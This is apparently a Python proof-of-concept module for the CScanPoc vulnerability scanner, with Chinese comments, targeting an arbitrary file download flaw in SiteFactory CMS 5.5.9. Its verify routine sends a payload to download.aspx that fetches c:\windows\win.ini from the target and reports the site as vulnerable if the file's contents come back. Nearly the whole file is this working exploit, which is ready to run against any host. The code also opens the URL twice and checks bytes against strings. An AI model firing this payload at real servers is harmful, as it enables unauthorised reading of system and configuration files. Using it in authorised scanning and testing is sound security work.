# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse
import urllib.request
import urllib.parse
import urllib.error

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'SiteFactoryCMS_0101'  # 平台漏洞编号，留空
    name = 'SiteFactory CMS 5.5.9 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-08-25'  # 漏洞公布时间
    desc = '''
        动易SiteFactory内容管理系统是业界首款基于微软.NET2.0平台，采用ASP.NET 2.0进行分层开发的内容管理系统（Content Management System）。
        SiteFactory CMS 5.5.9任意文件下载漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SiteFactoryCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '75db1b7f-193a-48c9-8b8e-39d5eebbf4ab'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = (
                '/sitefactory/assets/download.aspx?file=c%3a\\windows\\win.ini')
            verify_url = self.target + payload
            req = urllib.request.urlopen(verify_url)
            statecode = urllib.request.urlopen(verify_url).getcode()
            content = req.read()
            if statecode == 200 and '[fonts]' in content and '[files]' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
